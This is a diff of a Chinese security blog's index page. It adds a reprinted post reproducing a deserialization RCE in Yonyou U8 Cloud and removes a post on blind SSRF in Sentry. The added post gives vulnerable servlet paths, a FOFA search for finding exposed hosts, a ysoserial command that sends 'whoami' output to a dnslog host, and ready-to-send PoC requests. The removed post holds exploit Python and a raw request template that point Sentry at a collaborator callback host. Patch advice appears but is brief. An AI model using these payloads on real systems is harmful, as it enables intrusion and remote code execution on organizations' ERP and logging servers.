@@ -86,6 +86,71 @@
 
     
         <h2 class="title">
+            <a href="/2025/11/06/U8-Cloud-RCE/">
+                用友U8 Cloud 反序列化RCE漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Nov 6, 2025
+    </time>
+    <section class="content">
+        <h1><span id="用友u8-cloud-反序列化rce漏洞复现">用友U8 Cloud 反序列化RCE漏洞复现</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://jishuzhan.net/article/1722119007621877762">OidBoy_G</a> 并作补充</p>
+</blockquote>
+<h2><span id="0x01-产品简介">0x01 产品简介</span></h2><blockquote>
+<p>用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。</p>
+</blockquote>
+<h2><span id="0x02-漏洞概述">0x02 漏洞概述</span></h2><blockquote>
+<p>用友U8 Cloud存在多处（FileManageServlet和LoginVideoServlet）反序列化漏洞，系统未将用户传入的序列化数据进行过滤就直接执行反序列化操作，结合系统本身存在的反序列化利用链，最终造成远程代码执行。</p>
+</blockquote>
+<h2><span id="0x03-影响范围">0x03 影响范围</span></h2><blockquote>
+<p>用友U8 Cloud 所有版本</p>
+</blockquote>
+<h2><span id="0x04-复现环境">0x04 复现环境</span></h2><blockquote>
+<p>FOFA：app&#x3D;”用友-U8-Cloud”</p>
+</blockquote>
+<h2><span id="0x05-漏洞复现">0x05 漏洞复现</span></h2><blockquote>
+<p>两处接口的反序列化漏洞路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet</span><br><span class="line">/servlet/~uap/nc.bs.sm.login2.LoginVideoServlet</span><br></pre></td></tr></table></figure>
+
+<p>PS：用友的反序列化漏洞大部分cc6就可以直接打，post请求传入反序列化的二进制数据 就可以进行命令执行，ysoserial工具集成了多种cc链，感兴趣的可以研究研究</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/releases/tag/v0.0.6">https://github.com/frohoff/ysoserial/releases/tag/v0.0.6</a></p>
+<p>构造序列化数据(jdk1.8)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 <span class="string">&quot;ping `whoami`.l4z6nq7x.dnslog.pw&quot;</span> &gt;4.ser</span><br></pre></td></tr></table></figure>
+
+<p>PoC</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">C:</span>\Users\m1813\Desktop\<span class="number">4</span>.ser)&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">POST /servlet/~uap/nc.bs.sm.login2.LoginVideoServlet HTTP/1.1</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Host: your-ip</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Content-Type: *</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">C:</span>\Users\m1813\Desktop\<span class="number">4</span>.ser)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>PS：里面生成序列化数据文件的路径自行修改</p>
+<p>两个路径都可以打，自行测试</p>
+</blockquote>
+<h2><span id="0x06-修复建议">0x06 修复建议</span></h2><blockquote>
+<p><strong>官方修复方案</strong> ：</p>
+<p>用友安全中心已发布官方补丁：</p>
+<p><a target="_blank" rel="noopener" href="https://security.yonyou.com/#/noticeInfo?id=400">https://security.yonyou.com/#/noticeInfo?id=400</a></p>
+<p><a target="_blank" rel="noopener" href="https://security.yonyou.com/#/noticeInfo?id=399">https://security.yonyou.com/#/noticeInfo?id=399</a></p>
+<p><strong>临时修复方案：</strong></p>
+<p>使用ACL网络策略限制访问来源；</p>
+<p>使用防护类设备对&#x2F;servlet&#x2F;<del>uap&#x2F;nc.impl.pub.filesystem.FileManageServlet和&#x2F;servlet&#x2F;</del>uap&#x2F;nc.bs.sm.login2.LoginVideoServlet路径进行防护。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/U8Cloud/" rel="tag">U8Cloud</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2025/11/06/CVE-2024-4577-PHP-CGI/">
                 PHP CGI 远程代码执行漏洞分析（CVE-2024-4577）
             </a>
@@ -999,57 +1064,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/Sentry-SSRF/">
-                Sentry SSRF
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> 并作补充</p>
-</blockquote>
-<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
-<p>Sentry 是一个实时的事件日志和聚合平台，基于 Django 构建。一般在url上、或者logo上看到有sentry都可以用它的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
-</blockquote>
-<h2><span id="exp-testing">exp testing</span></h2><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) ➜  sentrySSRF git:(master) python sentrySSRF.py -i http://【your target url】 -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@【your target url】/1</span><br><span class="line">Enter your burpcollaborator address:【your dnslog】</span><br></pre></td></tr></table></figure>
-
-<p>然后去你到dnslog看看有没有请求记录即可。</p>
-<p>exp源码参考：<br>配置如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=【your</span> key】 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 【your <span class="string">target</span> url】.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:【随意domain】</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://【your dnslog】&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
-<p>sentry_version &#x3D; 红线2 （报错可以手动修改几个其他版本试试）<br>sentry_key &#x3D; Raven.config 红线1<br>origin &#x3D; 可以随便写</p>
-</blockquote>
-<h2><span id="repair">Repair</span></h2><blockquote>
-<p>1、sentry关闭 source code scrapping；<br>2、保证配置文件中的黑名单不为空：&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
-</blockquote>
-<h2><span id="reference">Reference</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
             </div>
         
 
